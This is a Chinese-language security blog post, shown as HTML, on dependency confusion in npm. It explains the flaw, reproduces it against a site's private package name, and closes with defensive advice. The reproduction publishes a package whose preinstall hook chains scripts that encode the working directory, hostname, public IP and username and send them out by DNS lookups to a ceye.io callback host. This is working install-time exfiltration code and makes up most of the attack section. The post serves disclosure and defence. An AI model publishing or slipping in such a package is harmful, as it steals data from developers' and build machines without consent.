<!DOCTYPE html>
<html>
        <head>
        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
        <meta charset="utf-8">
        <title>Dependency Confusion | 老白</title>
        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
         <script >hljs.initHighlightingOnLoad();</script>

    </head>
    <body>
              <header class="header mdui-m-b-5">      
            <div class="container  ">
                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
           
            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
                   
                            <li><a href="/">首页</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/archives">归档</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/tags">标签</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                  </nav>
                </div>
        </header>
        <div class="mdui-container ">
                <div class="mdui-row">
                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
                                    <div class="post-title  mdui-m-b-1">Dependency Confusion</div>
                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-10-03 13:52:47">2021-10-03 / 4 min read</div>
                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="前言">前言</h1>
<p>  Dependency Confusion，一个让微软、苹果、PayPal、Shopify等公司给出3W美元赏金的漏洞</p>
<h1 id="漏洞原理与分析">漏洞原理与分析</h1>
<p>  我们常用Python、Ruby、Nodejs等编程语言构建项目，都会引用一些依赖包。如果应用的构建使用私有的、内部创建的依赖项，而该依赖项在公共开源存储库中不存在，那么就会发生Dependency Confusion。攻击者能够在公共存储库上以相同的名称注册具有更高版本号的依赖项。然后，最可能发生的是，应用在构建的时候会拉取攻击者在公共依赖库中上传的高版本依赖包，从而执行攻击者的代码。</p>
<h1 id="漏洞复现">漏洞复现</h1>
<h4 id="1-访问某站点时发现该站点引用了一部分-npm-包"> 1、访问某站点时发现该站点引用了一部分 npm 包；</h4>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641207155562.png" alt="" loading="lazy"></figure>
<h4 id="2-npmjs查找-npm-包并未发现确认为私有包"> 2、<a href="https://www.npmjs.com/">npmjs</a>查找 npm 包，并未发现，确认为私有包；</h4>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1642324613899.png" alt="" loading="lazy"></figure>
<h4 id="3-注册包名并发布恶意代码以下代码仅作漏洞证明"> 3、注册包名，并发布恶意代码（以下代码仅作漏洞证明）</h4>
<p> index.js</p>
<pre><code>const { exec } = require(&quot;child_process&quot;);
exec(&quot;pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done; b=$(hostname | head | xxd -p) &amp;&amp; nslookup $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; c=$(curl ifconfig.me | head | xxd -p) &amp;&amp; nslookup $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; d=$(echo shineout-mobile | head | xxd -p) &amp;&amp; nslookup $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; e=$(whoami | head | xxd -p ) &amp;&amp; nslookup $a.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
 if(error){
  console.log(&quot;error&quot;,error.message);
  return;
 }
 if(getter){
  console.log(data);
  return;
 }
 console.log(data);

});
</code></pre>
<p> build.js</p>
<pre><code>exec(&quot;node main.js  &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
 if(error){
  console.log(&quot;error&quot;,error.message);
  return;
 }
 if(getter){
  console.log(data);
  return;
 }
 console.log(data);

});
</code></pre>
<p> main.js</p>
<pre><code>const { exec } = require(&quot;child_process&quot;);
exec(&quot;node index.js  &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sh setup.sh &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
 if(error){
  console.log(&quot;error&quot;,error.message);
  return;
 }
 if(getter){
  console.log(data);
  return;
 }
 console.log(data);

});
</code></pre>
<p> package.json</p>
<pre><code>{
  &quot;name&quot;: &quot;&lt;npm_package_name&gt;&quot;,
  &quot;version&quot;: &quot;2.0.0&quot;,
  &quot;description&quot;: &quot;&quot;,
  &quot;main&quot;: &quot;main.js&quot;,
  &quot;scripts&quot;: {
    &quot;preinstall&quot;: &quot;node build.js&quot;,
    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
  },
  &quot;author&quot;: &quot;laobai&quot;,
  &quot;license&quot;: &quot;ISC&quot;,
  &quot;dependencies&quot;: {
    &quot;express&quot;: &quot;^4.17.1&quot;,
    &quot;lodash&quot;: &quot;^4.17.21&quot;
  }
}
</code></pre>
<p> setup.sh</p>
<pre><code>#!/usr/bin/bash

pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done;
b=$(hostname | head | base64) &amp;&amp; dig $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
c=$(curl ifconfig.me | head | base64) &amp;&amp; dig $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
d=$(echo &quot;shineout-mobile&quot; | head | base64) &amp;&amp; dig $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
</code></pre>
<h1 id="四-防范">四、防范</h1>
<p>  1、对于第三方依赖包，均在外部公共库进行注册；<br>
  2、维护内部源，维护依赖包列表，相关私有包只能从内部源中获取；<br>
  3、对于从外部源获取的包，采用SCA进行扫描（不过现在市面上的SCA均是以比对漏洞库的形式检测，个人认为必要时可以采用SAST代替这部分的扫描任务）。<br>
  <a href="https://azure.microsoft.com/zh-cn/resources/3-ways-to-mitigate-risk-using-private-package-feeds/">微软白皮书</a></p>
<h1 id="五-杂谈">五、杂谈</h1>
<p>  Dependency Confusion作为供应链攻击的一种，该漏洞已经影响了很多大厂<br>
<img src="https://V-alkoinen.github.io/post-images/1642329462997.png" alt="" loading="lazy"><br>
<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">相关文章</a></p>
</div>
                                    <div class="mdui-divider mdui-m-b-2"></div>
                                    <div class="mdui-row-xs-2 post-fenye">
                                       
                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">CVE-2021-42287/CVE-2021-42278 一键域控</a></div></div>
                                        

                                        
                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/you-jian-wei-zao/">邮件伪造</a></div> </div>
                                       
                                      </div>
                                   
                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
                                    
                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
 <div class="comment"></div>

<script>
      new Valine({
            el: '.comment',



            path: window.location.pathname,
            pageSize: 30,
            avatar:'mm', 
       })
    </script> 
<script>
    if(window.location.hash){
        var checkExist = setInterval(function() {
           if ($(window.location.hash).length) {
              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
              clearInterval(checkExist);
           }
        }, 100);
    }
</script>
                                </article>

                                    
                        </div>
                      </div>
    
                

              </div>
                    <footer class="footer mdui-m-t-5 mdui-text-center">
               <nav class="social-links">
                      <ul>
                      
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      </ul>
                    </nav>
                    <div class="copyright">
                      
                  </div>
                  
              </footer>
    </body>
</html>